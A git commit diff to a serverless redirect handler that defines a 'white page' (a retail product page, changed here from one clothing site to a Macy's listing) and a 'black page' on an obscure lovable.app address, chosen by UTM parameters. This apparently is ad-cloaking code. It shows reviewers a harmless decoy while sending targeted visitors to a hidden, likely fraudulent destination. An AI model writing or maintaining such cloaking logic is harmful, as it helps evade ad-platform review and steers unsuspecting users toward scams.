c22b780bf1adaa878c0dfc4e26fd94e52de00c40
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-02 18:17:28 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://en.sergent-major.com/ivory-dress-25H2PFT2ROB005.html";
+    const whitePageURL = "https://www.macys.com/shop/product/easy-spirit-womens-elinn-cozy-slip-on-mules?ID=19094076";
     const blackPageURL = "https://casssshlov.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
